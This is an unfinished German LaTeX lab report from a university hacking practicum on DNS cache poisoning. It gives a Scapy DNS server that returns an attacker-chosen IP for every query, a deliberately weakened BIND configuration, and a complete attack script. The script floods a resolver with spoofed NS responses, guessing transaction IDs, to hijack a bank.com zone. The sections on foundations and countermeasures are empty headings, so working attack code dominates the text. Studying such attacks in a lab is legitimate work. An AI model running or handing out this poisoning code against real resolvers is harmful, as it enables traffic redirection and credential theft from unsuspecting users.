\documentclass[10pt,a4paper]{article}
\usepackage[utf8]{inputenc}
\usepackage[german]{babel}
\usepackage[T1]{fontenc}
\usepackage{fullpage}
\usepackage{amssymb}
\usepackage{listings}
\usepackage{caption}
\usepackage{color}
\usepackage{amsmath}
\usepackage{graphicx}
\usepackage{hyperref}
\usepackage{colortbl}
\usepackage{hhline}

\setlength{\parindent}{0pt}
\setlength{\columnsep}{0.5cm}

% Python colored syntax highlighting
\usepackage{listings}
\usepackage{color}
\usepackage{amsmath}
\definecolor{dark-gray}{RGB}{135,135,135}
\definecolor{light-blue}{RGB}{102,178,255}
\definecolor{light-orchid}{RGB}{210,120,210}
\lstdefinelanguage{python-color}{
 morekeywords={and, as, assert, break, class, continue, def, del, elif, else, except, exec, finally, for, from, global, if, import, in, is, lambda, not, or, pass, print, raise, return, try, while, with, yield, None, True, False, import},
 ndkeywords={self},
 keywordstyle=\color{blue}\bfseries,
 ndkeywordstyle=\color{light-orchid}\bfseries,
 sensitive=false,
 identifierstyle=\color{black},
 basicstyle=\sffamily ,
 morecomment=[l]{\#},
 morecomment=[s]{/*}{*/},
 morecomment=[s]{"""}{"""},
 morecomment=[l][\color{light-blue}]{@},
 morecomment=[s][\color{light-blue}]{"}{"},
 commentstyle=\itshape\color{dark-gray},
 stringstyle=\color{red}\ttfamily,
 tabsize=2,
 columns=fullflexible,
 literate={^}{{$\mspace{-3mu}\hat{\quad}\mspace{-5mu}$}}1
 {<}{$<$}2 
 {>}{$>$}2 
 {<:}{{$<\mspace{-3mu}:$}}2 
 {:>}{{$:\mspace{-3mu}>$}}2
 {+}{$+$ }2 
 {++}{{$+\mspace{-8mu}+$ }}2
 {\~}{{$\mspace{-3mu}\tilde{\quad}\mspace{-3mu}$}}1
 {\~}{$\sim$}1
 {__}{\underline{\hspace{0.5cm}}}1
 {*}{${}^{\ast}$}1 
 {.}{$\mspace{1mu}.\mspace{1mu}$}1
}
\lstset{language=python-color}
\lstset{framexleftmargin=5pt, framextopmargin=5pt, framexbottommargin=5pt, frame=tb, framerule=0pt}
\definecolor{grey}{rgb}{0.9,0.9,0.9}
%\newcounter{nalg}[section] % defines algorithm counter for chapter-level
%\renewcommand{\thenalg}{\thechapter .\arabic{nalg}} %defines appearance of the algorithm counter
%\DeclareCaptionLabelFormat{algocaption}{Algorithm \thenalg} % defines a new caption label as Algorithm x.y

\lstnewenvironment{algorithm}[1][] %defines the algorithm listing environment
{   
    %\refstepcounter{nalg} %increments algorithm number
    %\captionsetup{labelformat=algocaption,labelsep=colon} %defines the caption setup for: it ises label format as the declared caption label above and makes label and caption text to be separated by a ':'
    \lstset{ %this is the stype
        mathescape=true,
        keywordstyle=\color{black}\bfseries\em,
        keywords={,input, output, return, datatype, function, in, if, else, foreach, while, begin, end, for, endfor, from, to, do, loop, print, }, %add the keywords you want, or load a language as Rubens explains in his comment above.        
        #1 % this is to add specific settings to an usage of this environment (for instnce, the caption and referable label)
    }
}
{}

\author{Lukas Jung, Marc Narres-Schulz, Oliver Sänger, Tobias Zeimetz}
\title{Teil III: \\DNS Cache Poisoning}

\begin{document}
\maketitle
\newpage

\section{Einleitung}
Bei der vorliegenden Arbeit handelt es sich um ein Protokoll über eine Teilaufgabe im \glqq Hackerpraktikum\grqq. Die erste Aufgabe bestand in der Programmierung eines eigenen DNS-Servers. Der Server wurde in der Programmiersprache Python geschrieben und als Hilfe wurde das Modul Scapy verwendet. Der Python-Server sollte in der Lage sein, auf eine DNS-Anfrage eine entsprechend korrekt geformte Antwort zu senden. Die IP, mit welcher der Python-Server antwortet, sollte selbst einstellbar sein.

Anschließend sollte ein DNS-Server aufgesetzt und konfiguriert werden. Dieser Server sollte später das Ziel des DNS-Cache-Poisoning-Angriffs sein. Die grundlegende Idee bestand darin, erst alle Sicherheitseigenschaften des Servers gegen diesen einen Angriff zu deaktivieren. Anschließend bestand das Ziel darin den Cache des DNS-Servers (Victim-DNS) zu \glqq vergiften\grqq \ und eine fehlerhaften DNS-Auflösung zu injecten. Ferner war das Ziel, den Cache des Victim-DNS so zu manipulieren, dass alle Anfragen an den in Python selbstgeschriebenen DNS-Server (Python-Server oder auch Attacker-DNS) weitergeleitet werden. Dadurch ist es dem Angreifer immer möglich eine andere IP-Adresse für die Auflösung zu wählen. Eine genauer Erläuterung folgt in den nächsten Kapiteln.

Die folgenden Kapitel beschäftigen sich mit den Grundlagen des Angriffs, das heißt wie sollte in der Theorie vorgegangen werden, wie müssen die Abläufe aussehen und was sind die Vorrausetzungen für den Angriff. Außerdem wird der Angriff im Detaill genauer Erklärt. Der nächste Abschnitt besteht aus der Konfiguration der Server, welche Komponenten verwenden wurden und welche Sicherheitsmaßnahmen deaktiviert wurden. Im letzten Kapitel folgt anschließend eine detaillierte Beschreibung unseres Vorgehens, wie unsere Implementierung des Angriffs funktioniert und welche Tests durchgeführt wurden.

\section{Grundlagen des Angriffs}

\section{Konfigurationen der Server und Schnittstellen}
Dieses Kapitel beschäftig sich mit unserer Netzwerkstruktur, den verwenden System und ihren Konfigurationen. Zu erst wird auf den aus Ausgabe 2 in Python implementierten DNS-Server eingegangen. Anschließend werden die Konfigurationen des in Ubuntu aufgesetzten DNS-Servers dargelegt und genauer Erläutert. Im letzten Abschnitt dieses Kapitels wird die Architektur unseren Netwerks dargestellt. Genauer heißt das, wie kommunizieren die einzelnen Parteien miteinander und wie sind sie verbunden.

\subsection{Python DNS-Server}
Die erste Aufgabe bestand darin, einen DNS-Server in Python mit Hilfe von Scapy zu implementieren. Die IP dieses DNS-Servers wird später dazu verwenden um einen gefälschten NS-Eintrag in den Victim-DNS einzuschleusen. Der dazugehörige Programmcode gestaltet sich folgendermaßen:
\begin{center}
\begin{lstlisting}
import os
from socket import AF_INET, SOCK_DGRAM, socket

from scapy.all import DNS, DNSQR, DNSRR, dnsqtypes

sock = socket(AF_INET, SOCK_DGRAM)
sock.bind((os.environ['ATK_SERVER_IP'], 53))

fixed_ip = os.environ['ATK_FORGED_IP']
\end{lstlisting}
\end{center}
%TODO das mit der fixed ip
Da DNS-Server primär Anfragen (Requests) über das User Datagram Protocol (UDP) und Port 53 erhalten, liegt der erste Schritt im erstellen und binden eines Datagram Sockets (SOCK\_DGRAM). Dieser Socket ist wie es bei DNS oft üblich ist an den Port 53 gebunden. Die Variable $fixed\_ip$ erhählt einen vom Benutzer selbst gewählte IP-Adresse als Eingabe. Die Adresse wird beim Start des Python-Servers abgefragt.
\begin{center}
\begin{lstlisting}
while True:
    # DNS server that resolves every A record to a fixed A:IPV4 response.
    request, addr = sock.recvfrom(4096)

    dns_request = DNS(request)
    assert dns_request.opcode == 0, dns_request.opcode  # QUERY
    assert dnsqtypes[dns_request[DNSQR].qtype] == 'A', dns_request[DNSQR].qtype
\end{lstlisting}
\end{center}
Die While-Schleife sorgt dafür, dass der Socket niemals geschlossen wird und alle DNS-Anfragen (Querries) mit der zuvor selbst gewählten $\mathit{fixed\_ip}$ beantwortet. In der Variablen $\mathit{request}$ sind alle Informationen der DNS-Anfrage enthalten. Die Informationen der Anfragen werden später beim Erstellen der Antwort verwendet, um eine erwartungsgemäße und korrekte Antwort zurück zu liefern. 

Als Nächstes wird mit $\mathit{assert}$ sichergestellt, dass zum Einen der OP-Code null ist und zum Anderen es sich um eine A-Record-Anfrage handelt. Dadurch dass der OP-Code null ist, weiß unser Python-Server, dass es sich um eine DNS-Anfrage (Query) handelt. Da das Ziel darin besteht, einem Benutzer (eines Browsers) eine falsche IP zurück zu liefern, muss dieser auch eine IP-Auflösung anfragen. Da es sich bei einer IP-Auflösung um einen sogenannten A-Record handelt, prüft unser DNS-Server ebenfalls den Typ der Anfrage.
\begin{center}
\begin{lstlisting}
    response = DNS(
        id=dns_request.id,
        qr=1, opcode=0, aa=1, tc=0, rd=0, ra=0, z=0, rcode=0,  
        qdcount=1, ancount=1,
        nscount=dns_request.nscount,
        arcount=dns_request.arcount,
        ad=dns_request.ad,
        cd=dns_request.cd,
        qd=DNSQR(qname=dns_request[DNSQR].qname, qtype='A', qclass='IN'),
        an=DNSRR(rrname=dns_request[DNSQR].qname, type='A', rclass='IN', 
        	rdata=fixed_ip, ttl=86400),
        ns=dns_request.ns,
        ar=dns_request.ar
    )

    sock.sendto(bytes(response), addr)
\end{lstlisting}
\end{center}
Anschließend wird eine Antwort gebildet, welche zu der Angefragen Website die IP beinhaltet bzw. in unserem Fall eine vom Angreifer selbst gewählte IP. Um ein gültiges Antwort-Paket zu bilden, müssen mehrere Optionen (sogennante Flags) korrekt gesetzt sein. Die Optionen werden im Folgenden aus Gründen der Einfachheit in tabellarischer Form erläutert:
\begin{center}
	\setlength\arrayrulewidth{0.6pt}    
    \begin{tabular}{ | p{4.8cm} | p{8.5cm} |}
    \rowcolor[gray]{0.9} 
    \hline
    Flag & Bedeutung \\ \hline
    \hline
    id=dns\_request.id & Hierbei handelt es sich um die Transaktions-ID (TID). Die Antwort muss die gleiche TID besitzen 
    wie die Anfrage.\\ \hline
    qr=1 & Die Flag qr steht für Query/Response. Eine eins im Paket bedeutet, dass es sich um eine Antwort handelt\\ \hline
    opcode=0 & Durch diese Option wird angegeben, dass es sich um eine Standard-Query handelt\\ \hline
    aa=1 & Wie bereits in Kapitel X erkläutert wurde, ist es wichtig, dass es sich bei der Antwort um eine \glqq Authoritative\grqq \ Antwort handelt. Das setzen der Flag auf den Wert Eins wird die Antwort Authoritative.\\ \hline
    \end{tabular}
\end{center}    
\begin{center}
    \begin{tabular}{ | p{4.8cm} | p{8.5cm} |}
    \hline
    tc=0 & Sollten die zu übermittelnden Daten größer als 512 Bytes sein, sind UDP-Pakete zu kleine für eine solche Antwort. In diesem Fall müsste das Bit auf Eins gestellt werden um dem Empfänger des Paketes anzugeben, das es sich um ein TCP-Package handelt.\\ \hline
    rd=0, ra=0 & Die beiden Flags sind zum Angeben das eine Rekursion benötigt (desired) oder verfügbar (available) ist. In unserem Fall beantworten wir jedoch die Anfragen alle mit einer IP, daher kann diese Option auf Null gesetzt werden.\\ \hline
    z=0 & Hierbei handelt es sich um ein reserviertes Bit, welches immer auf Null gesetzt sein muss.\\ \hline
    rcode=0 & Der rcode ist der Antwort Code (Response Code) vom Server. Hier gibt es die Möglichkeit mehr als nur zwei Optionen zu wählen. Hier steht 0 für \glqq ok\grqq, 1 für \glqq format-error\grqq, 2 für \glqq server-failure\grqq, 3 für \glqq name-error\grqq, 4 für \glqq not-implemented\grqq, 5 für \glqq refused\grqq.\\ \hline
    qdcount=1 & Steht für Question Record Count und gibt an nach was gesucht wird. Beinhaltet sind dabei die URL, der Typ der Anfrage und andere Informationen. Da ein DNS-Server immer die Frage im Antwortpaket wiederholt, muss dieser Wert auf Eins gesetzt sein.\\ \hline
    ancount=1 & Gibt an wieviele Records in der Antwort mitgeliefert werden. Da wir nur eine falsche IP übertragen wollen steht dieser Wert auf Eins.\\ \hline
    nscount=dns\_request.nscount & \\ \hline
    arcount=dns\_request.arcount & \\ \hline
    ad=dns\_request.ad & \\ \hline
    cd=dns\_request.cd & \\ \hline
    qd=DNSQR(qname= dns\_request[DNSQR].qname, qtype='A', qclass='IN') & Die Abkürzung qd steht für Query Data. Hier wird lediglich die DNS-Anfrage eingetragen und dass es sich um enen A-Record handelt.\\ \hline
    an, ns, ar & \\
    \hline
    \end{tabular}
\end{center}
In einem letzten Schritt wird das gebildete Paket als Antwort auf die DNS-Anfrage zurück gesendet.

\subsection{Victim DNS-Server}
\begin{center}
\begin{lstlisting}
options {
    directory "/etc/namedb";
    pid-file "/var/run/named.pid";
    statistics-file "/var/run/named.stats";

    query-source address <ip> port <port_out>;

    dnssec-enable no;

    allow-recursion { any; };
    allow-query { any; };

    auth-nxdomain no;    # conform to RFC1035

    listen-on-v6 { none; };

    listen-on port <port_in> {
        127.0.0.1;
        <ip>;
    };

};
\end{lstlisting}
\end{center}

\subsection{Protokollfluss}

\section{Der Angriff}
In folgendem Abschnitt wird die praktische Umsetzung des Angriffs genauer dargelegt. Im ersten Unterpunkt wird auf die konkrete Implementierung in Python mithilfe von Scapy eingegangen. Dabei wird dargelegt, was die einzelnen Optionen bedeuten und wie sie zu interpretieren sind. Als nächstes folgt eine Beschreibung unserer Vorgehensweise und welche Versuche und Versuchsreihen durchgeführt wurden. Zum Schluss werden Gegenmaßnahmen aufgezählt, die einen solchen Angriff verhindern sollen.

\subsection{Das Python Programm}
\begin{center}
\begin{lstlisting}
import os
import random
from socket import AF_INET, SOCK_DGRAM, socket

from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, sr1, sendpfast, Ether

sock = socket(AF_INET, SOCK_DGRAM)
sock.bind((os.environ['ATK_SERVER_IP'], 1234))

# Vulnerable recursive DNS server settings
target_dns_ip = os.environ['VLN_SERVER_IP']
target_dns_port_in = int(os.environ['VLN_DNS_PORT_IN'])
target_dns_port_out = int(os.environ['VLN_DNS_PORT_OUT'])
\end{lstlisting}
\end{center}
\begin{center}
\begin{lstlisting}
# Target domain base to be messed with
target_domain_base = ".bank.com"
# Authoritative NS for the target domain
known_ns_domain = "ns01.cashparking.com."
known_ns_ip = "216.69.185.38"

# Malicious DNS server
attacker_dns_ip = os.environ['ATK_SERVER_IP']
expected_ip = os.environ['ATK_FORGED_IP']
\end{lstlisting}
\end{center}
\begin{center}
\begin{lstlisting}
def initial_request(domain, ip, port):
    return Ether() / IP(dst=ip) / UDP(dport=port) / DNS(
        id=42,
        qr=0,
        rd=1,
        ra=0,
        qdcount=1,
        ancount=0,
        nscount=0,
        arcount=0,
        qd=DNSQR(qname=domain, qtype='A', qclass='IN')
    )
\end{lstlisting}
\end{center}
\begin{center}
\begin{lstlisting}
def forged_ns_response(id, target_domain, target_ip, attacker_dns_ip, known_ns_domain, 
	known_ns_ip, dst_port):
    response = Ether() / IP(src=known_ns_ip, dst=target_ip) / UDP(dport=dst_port) / DNS(
        id=id,  # Query ID / transaction id
        qr=1,  # QR (Query / Response) 1=response
        opcode=0,  # Set by client to 0 for a standard query, 0:"QUERY",1:"IQUERY",2:"STATUS"
        aa=0,  # Set to 1 in a server response if this dns_response is Authoritative, 0 if not.
        tc=0,
        # Set to 1 in a server response if the dns_response can't fit in the 512-byte limit of a 
        # UDP packet response
        rd=1,  # RD (Recursion Desired)
        ra=0,  # RA (Recursion Available), set by server: will (1) or won't (0) support recursion
        z=0,  # This is reserved and must be zero
        rcode=0,  # Response code from the server: indicates success or failure
        # 0:"ok", 1:"format-error", 2:"server-failure", 3:"name-error", 4:"not-implemented", 
        # 5:"refused"
        qdcount=1,  # Question record count
        ancount=0,  # Answer count
        nscount=1,  # authority count
        arcount=1,  # additional record count
        # AD and CD bits are defined in RFC 2535
        ad=0,  # # Authentic Data
        cd=0,  # Checking Disabled (0/1)
        # DNS Question Record
        qd=DNSQR(qname=target_domain, qtype='A', qclass='IN'),
        # DNS Resource Record
        an=0,
        ns=DNSRR(rrname=target_domain, type='NS', rdata=known_ns_domain, ttl=253643),
        ar=DNSRR(rrname=known_ns_domain, type='A', rdata=attacker_dns_ip, ttl=253643)
    )
    return response
\end{lstlisting}
\end{center}
\begin{center}
\begin{lstlisting}
counter = 0
while True:
    target_domain = "www" + str(counter) + target_domain_base
    counter = (counter + 1) % (2 ** 16)

    packet_list = [initial_request(target_domain, target_dns_ip, target_dns_port_in)]

    response_amount = 50
    r = random.randint(0, (2 ** 16) - response_amount + 1)
    for i in range(r, r + response_amount):
        packet_list.append(
            forged_ns_response(i, target_domain, target_dns_ip, attacker_dns_ip, 
            		known_ns_domain, known_ns_ip, target_dns_port_out))

    p_txid_match = (1 / (2 ** 16)) * response_amount * counter * 100
    print("Iteration: {}, possible cache poisoning: {:4.2f}%".format(counter, p_txid_match))
    print("Sending packets from {} with id in interval [{}, {}] to {}"
    	.format(known_ns_ip, r, r + response_amount, target_domain))

    sendpfast(packet_list, pps=100000, iface="eth1", verbose=0)

    dns_response = sr1(IP(dst=target_dns_ip) / UDP(dport=53) / DNS(rd=1, 
    	qd=DNSQR(qname=target_domain)), verbose=0)

    try:
        if dns_response[DNS].an.rdata == expected_ip:
            print("Successfully poisoned the zone of {}".format(target_domain_base))
            break
    except:
        print("Poisoning failed")
    break
\end{lstlisting}
\end{center}

\subsection{Versuchsreihen und Vorgehensweise}
\subsection{Schutz gegen den Angriff}
\subsection*{ID-Randomization}
\subsection*{Vollständige Port Randomization}
\subsection*{Random URL Capitalizing}

\section{Fazit}

\end{document}